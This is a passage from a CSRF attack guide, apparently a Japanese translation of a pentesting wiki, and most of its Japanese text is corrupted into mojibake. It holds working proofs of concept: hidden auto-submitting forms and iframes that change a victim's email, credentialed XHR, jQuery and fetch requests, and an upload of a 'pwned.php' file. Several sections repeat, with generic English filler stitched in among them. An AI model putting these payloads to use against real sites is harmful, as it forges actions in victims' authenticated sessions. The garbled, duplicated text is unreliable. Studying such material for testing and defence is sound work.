<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
### **HEADãƒ¡ã‚½ãƒƒãƒ‰ã®ãƒã‚¤ãƒ‘ã‚¹**

[**ã“ã®CTFã®è§£èª¬**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution)ã®æœ€åˆã®éƒ¨åˆ†ã§ã¯ã€[Oakã®ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰](https://github.com/oakserver/oak/blob/main/router.ts#L281)ã§ã€ãƒ«ãƒ¼ã‚¿ãƒ¼ãŒ**HEADãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã¨ã—ã¦å‡¦ç†**ã—ã€ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒœãƒ‡ã‚£ã¯ãªã„ã¨èª¬æ˜ã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯Oakã«é™ã‚‰ãšã€ä¸€èˆ¬çš„ãªå›é¿ç­–ã§ã™ã€‚HEADãƒªã‚¯ã‚¨ã‚¹ãƒˆã«ç‰¹å®šã®ãƒãƒ³ãƒ‰ãƒ©ãƒ¼ã‚’å‰²ã‚Šå½“ã¦ã‚‹ã®ã§ã¯ãªãã€å˜ã«**GETãƒãƒ³ãƒ‰ãƒ©ãƒ¼ã«æ¸¡ã•ã‚Œã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒœãƒ‡ã‚£ã‚’å‰Šé™¤ã™ã‚‹ã ã‘**ã§ã™ã€‚

ã—ãŸãŒã£ã¦ã€GETãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒåˆ¶é™ã•ã‚Œã¦ã„ã‚‹å ´åˆã€**GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã¨ã—ã¦å‡¦ç†ã•ã‚Œã‚‹HEADãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## **æ”»æ’ƒä¾‹**

### **CSRFãƒˆãƒ¼ã‚¯ãƒ³ã®å¤–éƒ¨æµå‡º**

ã‚‚ã—**CSRFãƒˆãƒ¼ã‚¯ãƒ³**ãŒ**é˜²å¾¡æ‰‹æ®µ**ã¨ã—ã¦ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆã€[**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens)ã®è„†å¼±æ€§ã‚„[**Dangling Markup**](dangling-markup-html-scriptless-injection/)ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã—ã¦**ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å¤–éƒ¨ã«æµå‡º**ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### **HTMLã‚¿ã‚°ã‚’ä½¿ç”¨ã—ãŸGETãƒªã‚¯ã‚¨ã‚¹ãƒˆ**
```markup
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
ä»–ã®HTML5ã‚¿ã‚°ã‚’ä½¿ç”¨ã—ã¦è‡ªå‹•çš„ã«GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

![](<../.gitbook/assets/image (530).png>)

### ãƒ•ã‚©ãƒ¼ãƒ ã®GETãƒªã‚¯ã‚¨ã‚¹ãƒˆ
```markup
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### ãƒ•ã‚©ãƒ¼ãƒ ã®POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆ

To perform a Cross-Site Request Forgery (CSRF) attack, an attacker can create a malicious HTML page that includes a form with a POST method. This form is designed to submit data to a target website without the user's knowledge or consent.

To execute the attack, the attacker tricks the victim into visiting the malicious page. When the victim loads the page, the form is automatically submitted, sending the data to the target website. Since the victim is already authenticated on the target website, the server processes the request as if it came from the victim.

The attacker can use this technique to perform various malicious actions, such as changing the victim's account settings, making unauthorized purchases, or even deleting data.

To protect against CSRF attacks, web developers should implement measures such as using anti-CSRF tokens, checking the Referer header, and implementing strict access controls. Additionally, users should be cautious when clicking on unfamiliar links or visiting suspicious websites to minimize the risk of falling victim to CSRF attacks.
```markup
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### iframeã‚’é€šã˜ãŸãƒ•ã‚©ãƒ¼ãƒ ã®POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆ

An attacker can exploit Cross-Site Request Forgery (CSRF) vulnerabilities by tricking a victim into submitting a malicious form through an iframe. This technique is commonly used to perform unauthorized actions on behalf of the victim without their knowledge.

To execute this attack, the attacker crafts a webpage containing an iframe that loads a target website vulnerable to CSRF. The iframe is then hidden from the victim's view using CSS. The attacker also includes a form within the iframe, pre-filled with the necessary data to perform the malicious action.

When the victim visits the attacker's webpage, the hidden iframe automatically submits the form to the target website, triggering the CSRF attack. Since the victim is already authenticated on the target website, the request appears legitimate, and the action is executed without any further user interaction.

To protect against this attack, web developers should implement measures such as CSRF tokens, which are unique and unpredictable values embedded within forms. These tokens are validated on the server-side to ensure that the request originated from a legitimate source.

### iframeã‚’ä»‹ã—ãŸãƒ•ã‚©ãƒ¼ãƒ ã®POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆ

æ”»æ’ƒè€…ã¯ã€iframeã‚’ä»‹ã—ã¦è¢«å®³è€…ã«æ‚ªæ„ã®ã‚ã‚‹ãƒ•ã‚©ãƒ¼ãƒ ã‚’é€ä¿¡ã•ã›ã‚‹ã“ã¨ã§ã€ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ•ã‚©ãƒ¼ã‚¸ã‚§ãƒªï¼ˆCSRFï¼‰ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®æŠ€è¡“ã¯ã€è¢«å®³è€…ã®çŸ¥è­˜ãªã—ã«è¢«å®³è€…ã®ä»£ã‚ã‚Šã«æ¨©é™ã®ãªã„æ“ä½œã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã‚ˆãä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

ã“ã®æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã€æ”»æ’ƒè€…ã¯CSRFã®è„†å¼±æ€§ãŒã‚ã‚‹ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‚’èª­ã¿è¾¼ã‚€iframeã‚’å«ã‚€ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã‚’ä½œæˆã—ã¾ã™ã€‚iframeã¯CSSã‚’ä½¿ç”¨ã—ã¦è¢«å®³è€…ã®è¦–ç•Œã‹ã‚‰éš ã•ã‚Œã¾ã™ã€‚æ”»æ’ƒè€…ã¯ã¾ãŸã€iframeå†…ã«å¿…è¦ãªãƒ‡ãƒ¼ã‚¿ã§äº‹å‰ã«å…¥åŠ›ã•ã‚ŒãŸãƒ•ã‚©ãƒ¼ãƒ ã‚‚å«ã‚ã¾ã™ã€‚

è¢«å®³è€…ãŒæ”»æ’ƒè€…ã®ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã‚’è¨ªã‚Œã‚‹ã¨ã€éš ã•ã‚ŒãŸiframeã¯è‡ªå‹•çš„ã«ãƒ•ã‚©ãƒ¼ãƒ ã‚’ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«é€ä¿¡ã—ã€CSRFæ”»æ’ƒãŒãƒˆãƒªã‚¬ãƒ¼ã•ã‚Œã¾ã™ã€‚è¢«å®³è€…ã¯æ—¢ã«ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã§èªè¨¼ã•ã‚Œã¦ã„ã‚‹ãŸã‚ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯æ­£å½“ãªã‚‚ã®ã¨è¦‹ãªã•ã‚Œã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã•ã‚‰ãªã‚‹æ“ä½œãªã—ã«ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ãŒå®Ÿè¡Œã•ã‚Œã¾ã™ã€‚

ã“ã®æ”»æ’ƒã‹ã‚‰ä¿è­·ã™ã‚‹ãŸã‚ã«ã€ã‚¦ã‚§ãƒ–é–‹ç™ºè€…ã¯CSRFãƒˆãƒ¼ã‚¯ãƒ³ãªã©ã®å¯¾ç­–ã‚’å®Ÿè£…ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚CSRFãƒˆãƒ¼ã‚¯ãƒ³ã¯ã€ãƒ•ã‚©ãƒ¼ãƒ å†…ã«åŸ‹ã‚è¾¼ã¾ã‚ŒãŸä¸€æ„ã‹ã¤äºˆæ¸¬ä¸å¯èƒ½ãªå€¤ã§ã™ã€‚ã“ã‚Œã‚‰ã®ãƒˆãƒ¼ã‚¯ãƒ³ã¯ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã§æ¤œè¨¼ã•ã‚Œã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒæ­£å½“ãªã‚½ãƒ¼ã‚¹ã‹ã‚‰ç™ºä¿¡ã•ã‚ŒãŸã‚‚ã®ã§ã‚ã‚‹ã“ã¨ã‚’ç¢ºèªã—ã¾ã™ã€‚
```markup
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Ajax POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆ**

Ajax POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãŒã‚µãƒ¼ãƒãƒ¼ã«ãƒ‡ãƒ¼ã‚¿ã‚’é€ä¿¡ã™ã‚‹ãŸã‚ã®éåŒæœŸé€šä¿¡ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã§ã™ã€‚ã“ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯ã€Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®æ©Ÿèƒ½ã‚’æ‹¡å¼µã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

ä»¥ä¸‹ã¯ã€Ajax POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®åŸºæœ¬çš„ãªæ§‹æ–‡ã§ã™ã€‚

```javascript
$.ajax({
    url: '/endpoint',
    type: 'POST',
    data: {
        param1: 'value1',
        param2: 'value2'
    },
    success: function(response) {
        // ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒæˆåŠŸã—ãŸå ´åˆã®å‡¦ç†
    },
    error: function(xhr, status, error) {
        // ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒå¤±æ•—ã—ãŸå ´åˆã®å‡¦ç†
    }
});
```

ã“ã®ä¾‹ã§ã¯ã€`/endpoint` ã¨ã„ã†ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«å¯¾ã—ã¦ã€POST ãƒ¡ã‚½ãƒƒãƒ‰ã§ãƒ‡ãƒ¼ã‚¿ã‚’é€ä¿¡ã—ã¦ã„ã¾ã™ã€‚`data` ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã«ã¯ã€é€ä¿¡ã™ã‚‹ãƒ‡ãƒ¼ã‚¿ã‚’ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆå½¢å¼ã§æŒ‡å®šã—ã¾ã™ã€‚

æˆåŠŸã—ãŸå ´åˆã¯ã€`success` ã‚³ãƒ¼ãƒ«ãƒãƒƒã‚¯é–¢æ•°ãŒå‘¼ã³å‡ºã•ã‚Œã€ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒ‡ãƒ¼ã‚¿ãŒå¼•æ•°ã¨ã—ã¦æ¸¡ã•ã‚Œã¾ã™ã€‚å¤±æ•—ã—ãŸå ´åˆã¯ã€`error` ã‚³ãƒ¼ãƒ«ãƒãƒƒã‚¯é–¢æ•°ãŒå‘¼ã³å‡ºã•ã‚Œã€ã‚¨ãƒ©ãƒ¼æƒ…å ±ãŒå¼•æ•°ã¨ã—ã¦æ¸¡ã•ã‚Œã¾ã™ã€‚

Ajax POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯ã€CSRFï¼ˆã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ•ã‚©ãƒ¼ã‚¸ã‚§ãƒªï¼‰æ”»æ’ƒã«å¯¾ã—ã¦è„†å¼±æ€§ã‚’æŒã¤ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ã“ã®æ”»æ’ƒã§ã¯ã€æ”»æ’ƒè€…ãŒè¢«å®³è€…ã®ä»£ã‚ã‚Šã«æ„å›³ã—ãªã„ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã®è„†å¼±æ€§ã‚’é˜²ããŸã‚ã«ã¯ã€é©åˆ‡ãªCSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚CSRFãƒˆãƒ¼ã‚¯ãƒ³ã¯ã€ã‚µãƒ¼ãƒãƒ¼ãŒç”Ÿæˆã—ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãŒãƒªã‚¯ã‚¨ã‚¹ãƒˆã¨ä¸€ç·’ã«é€ä¿¡ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã‚µãƒ¼ãƒãƒ¼ã¯ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒæœ‰åŠ¹ã‹ã©ã†ã‹ã‚’ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦æ¤œè¨¼ã—ã¾ã™ã€‚

CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’å®Ÿè£…ã™ã‚‹æ–¹æ³•ã¯ã€ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‚„ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã«ã‚ˆã£ã¦ç•°ãªã‚Šã¾ã™ãŒã€ä¸€èˆ¬çš„ã«ã¯ä»¥ä¸‹ã®æ‰‹é †ã«å¾“ã„ã¾ã™ã€‚

1. ã‚µãƒ¼ãƒãƒ¼ã¯ã€ã‚»ãƒƒã‚·ãƒ§ãƒ³ã”ã¨ã«ä¸€æ„ã®CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç”Ÿæˆã—ã¾ã™ã€‚
2. ã‚µãƒ¼ãƒãƒ¼ã¯ã€ç”Ÿæˆã•ã‚ŒãŸãƒˆãƒ¼ã‚¯ãƒ³ã‚’ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«é€ä¿¡ã—ã¾ã™ã€‚
3. ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¯ã€Ajax POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ãƒ‡ãƒ¼ã‚¿ã«ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å«ã‚ã¾ã™ã€‚
4. ã‚µãƒ¼ãƒãƒ¼ã¯ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å—ã‘å–ã£ãŸéš›ã«ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æ¤œè¨¼ã—ã€æœ‰åŠ¹ãªãƒªã‚¯ã‚¨ã‚¹ãƒˆã‹ã©ã†ã‹ã‚’åˆ¤æ–­ã—ã¾ã™ã€‚

ã“ã®ã‚ˆã†ã«ã™ã‚‹ã“ã¨ã§ã€CSRFæ”»æ’ƒã‚’é˜²ãã“ã¨ãŒã§ãã¾ã™ã€‚
```markup
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### multipart/form-data POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆ

When submitting a form with file uploads, the `multipart/form-data` content type is used in the POST request. This content type allows the form data to be sent as a series of parts, each containing a separate field and its corresponding value.

ãƒ•ã‚¡ã‚¤ãƒ«ã®ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã‚’å«ã‚€ãƒ•ã‚©ãƒ¼ãƒ ã‚’é€ä¿¡ã™ã‚‹éš›ã«ã¯ã€POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆã§ `multipart/form-data` ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚¿ã‚¤ãƒ—ãŒä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ã“ã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚¿ã‚¤ãƒ—ã§ã¯ã€ãƒ•ã‚©ãƒ¼ãƒ ãƒ‡ãƒ¼ã‚¿ãŒå€‹åˆ¥ã®ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã¨ãã®å¯¾å¿œã™ã‚‹å€¤ã‚’å«ã‚€ä¸€é€£ã®ãƒ‘ãƒ¼ãƒˆã¨ã—ã¦é€ä¿¡ã•ã‚Œã¾ã™ã€‚

Each part in the request body is separated by a boundary, which is a unique string that does not appear in the data. The boundary is specified in the `Content-Type` header of the request.

ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒœãƒ‡ã‚£å†…ã®å„ãƒ‘ãƒ¼ãƒˆã¯ã€ãƒ‡ãƒ¼ã‚¿ã«ã¯è¡¨ç¤ºã•ã‚Œãªã„ä¸€æ„ã®æ–‡å­—åˆ—ã§ã‚ã‚‹ãƒã‚¦ãƒ³ãƒ€ãƒªã«ã‚ˆã£ã¦åŒºåˆ‡ã‚‰ã‚Œã¾ã™ã€‚ãƒã‚¦ãƒ³ãƒ€ãƒªã¯ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã® `Content-Type` ãƒ˜ãƒƒãƒ€ã§æŒ‡å®šã•ã‚Œã¾ã™ã€‚

Each part consists of a header and a body. The header contains metadata about the part, such as the field name and the filename (if applicable). The body contains the actual data of the field.

å„ãƒ‘ãƒ¼ãƒˆã¯ãƒ˜ãƒƒãƒ€ã¨ãƒœãƒ‡ã‚£ã§æ§‹æˆã•ã‚Œã¾ã™ã€‚ãƒ˜ãƒƒãƒ€ã«ã¯ã€ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰åã‚„ãƒ•ã‚¡ã‚¤ãƒ«åï¼ˆè©²å½“ã™ã‚‹å ´åˆï¼‰ãªã©ã€ãƒ‘ãƒ¼ãƒˆã«é–¢ã™ã‚‹ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ãŒå«ã¾ã‚Œã¾ã™ã€‚ãƒœãƒ‡ã‚£ã«ã¯ã€ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã®å®Ÿéš›ã®ãƒ‡ãƒ¼ã‚¿ãŒå«ã¾ã‚Œã¾ã™ã€‚

To construct a `multipart/form-data` POST request, you need to set the `Content-Type` header to `multipart/form-data` and include the appropriate boundary. Each part is then formatted as follows:

`multipart/form-data` POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’æ§‹ç¯‰ã™ã‚‹ã«ã¯ã€`Content-Type` ãƒ˜ãƒƒãƒ€ã‚’ `multipart/form-data` ã«è¨­å®šã—ã€é©åˆ‡ãªãƒã‚¦ãƒ³ãƒ€ãƒªã‚’å«ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚å„ãƒ‘ãƒ¼ãƒˆã¯æ¬¡ã®ã‚ˆã†ã«ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆã•ã‚Œã¾ã™ã€‚

```
--boundary
Content-Disposition: form-data; name="field_name"; filename="file_name"
Content-Type: file_type

field_data
--boundary--
```

Here, `boundary` is the specified boundary string, `field_name` is the name of the field, `file_name` is the name of the file (if applicable), `file_type` is the MIME type of the file, and `field_data` is the actual data of the field.

ã“ã“ã§ã€`boundary` ã¯æŒ‡å®šã•ã‚ŒãŸãƒã‚¦ãƒ³ãƒ€ãƒªæ–‡å­—åˆ—ã€`field_name` ã¯ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã®åå‰ã€`file_name` ã¯ãƒ•ã‚¡ã‚¤ãƒ«ã®åå‰ï¼ˆè©²å½“ã™ã‚‹å ´åˆï¼‰ã€`file_type` ã¯ãƒ•ã‚¡ã‚¤ãƒ«ã® MIME ã‚¿ã‚¤ãƒ—ã€`field_data` ã¯ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã®å®Ÿéš›ã®ãƒ‡ãƒ¼ã‚¿ã§ã™ã€‚

By understanding the structure of a `multipart/form-data` POST request, you can effectively analyze and manipulate form data during penetration testing or other security assessments.

`multipart/form-data` POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®æ§‹é€ ã‚’ç†è§£ã™ã‚‹ã“ã¨ã§ã€ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆã‚„ä»–ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è©•ä¾¡ä¸­ã«ãƒ•ã‚©ãƒ¼ãƒ ãƒ‡ãƒ¼ã‚¿ã‚’åŠ¹æœçš„ã«åˆ†æãŠã‚ˆã³æ“ä½œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### multipart/form-data POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆ v2

In this technique, we will explore how to perform a Cross-Site Request Forgery (CSRF) attack using a multipart/form-data POST request.

#### Overview

A multipart/form-data POST request is commonly used to upload files or submit form data that includes binary content. This type of request consists of multiple parts, each containing a separate piece of data.

#### Steps

1. Identify the target: Choose the website or application you want to target for the CSRF attack.

2. Analyze the target: Understand the target's functionality and identify any forms or actions that can be exploited.

3. Create the malicious payload: Craft a malicious HTML page or script that will execute the CSRF attack. This payload should include a form with the necessary fields to perform the desired action on the target.

4. Prepare the multipart/form-data request: Use a tool like Burp Suite or cURL to capture a legitimate multipart/form-data POST request from the target application. Modify the request to include the necessary fields and values from your malicious payload.

5. Test the attack: Send the modified request to the target application and observe the result. If successful, the target will perform the desired action without the user's consent.

#### Example

Let's say we have a target website that allows users to change their email address by submitting a form. The form includes two fields: "email" and "csrf_token".

To perform a CSRF attack, we can create a malicious payload that includes a form with the following fields:

```html
<form action="https://target-website.com/change-email" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="email" value="attacker@example.com">
  <input type="hidden" name="csrf_token" value="malicious-csrf-token">
  <input type="submit" value="Change Email">
</form>
```

The "email" field is set to the attacker's email address, and the "csrf_token" field is set to a malicious CSRF token.

By capturing a legitimate multipart/form-data POST request from the target application and modifying it to include the fields from our malicious payload, we can trick the target into changing the user's email address without their consent.

#### Mitigation

To protect against CSRF attacks using multipart/form-data POST requests, consider implementing the following measures:

- Use anti-CSRF tokens: Include a unique token in each form submission and verify it on the server-side to ensure that the request is legitimate.

- Implement SameSite cookies: Set the SameSite attribute to "Strict" or "Lax" for cookies to prevent them from being sent in cross-site requests.

- Implement CSRF protection frameworks: Utilize frameworks like Django's CSRF protection or OWASP's CSRFGuard to add an extra layer of security against CSRF attacks.

By implementing these measures, you can significantly reduce the risk of CSRF attacks on your web application.
```javascript
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### iframe å†…ã‹ã‚‰ã®ãƒ•ã‚©ãƒ¼ãƒ  POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆ

When an HTML form is submitted, the browser sends a POST request to the specified URL. This behavior can be exploited in a Cross-Site Request Forgery (CSRF) attack when the form is submitted from within an iframe.

HTML ãƒ•ã‚©ãƒ¼ãƒ ãŒé€ä¿¡ã•ã‚Œã‚‹ã¨ã€ãƒ–ãƒ©ã‚¦ã‚¶ã¯æŒ‡å®šã•ã‚ŒãŸ URL ã« POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã¾ã™ã€‚ã“ã®å‹•ä½œã¯ã€ãƒ•ã‚©ãƒ¼ãƒ ãŒ iframe å†…ã‹ã‚‰é€ä¿¡ã•ã‚ŒãŸå ´åˆã«ã€ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ•ã‚©ãƒ¼ã‚¸ã‚§ãƒªï¼ˆCSRFï¼‰æ”»æ’ƒã§æ‚ªç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

To perform a CSRF attack using an iframe, an attacker can create a webpage with an iframe that loads the target website's form. The attacker can then use JavaScript to automatically submit the form without the user's knowledge.

iframe ã‚’ä½¿ç”¨ã—ã¦ CSRF æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ã«ã¯ã€æ”»æ’ƒè€…ã¯ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã®ãƒ•ã‚©ãƒ¼ãƒ ã‚’èª­ã¿è¾¼ã‚€ iframe ã‚’å«ã‚€ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã‚’ä½œæˆã—ã¾ã™ã€‚æ”»æ’ƒè€…ã¯ãã®å¾Œã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®çŸ¥è­˜ã‚’æŒãŸãšã« JavaScript ã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚©ãƒ¼ãƒ ã‚’è‡ªå‹•çš„ã«é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

This attack works because the browser includes the user's session cookies in the POST request, allowing the attacker to impersonate the user and perform actions on their behalf.

ã“ã®æ”»æ’ƒã¯ã€ãƒ–ãƒ©ã‚¦ã‚¶ãŒ POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚¯ãƒƒã‚­ãƒ¼ã‚’å«ã‚ã‚‹ãŸã‚ã€æ”»æ’ƒè€…ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ãªã‚Šã™ã¾ã—ã€ãã®ä»£ã‚ã‚Šã«æ“ä½œã‚’è¡Œã†ã“ã¨ãŒã§ãã‚‹ãŸã‚ã«æ©Ÿèƒ½ã—ã¾ã™ã€‚

To protect against CSRF attacks, web developers should implement measures such as using anti-CSRF tokens, validating the referrer header, and implementing strict access controls.

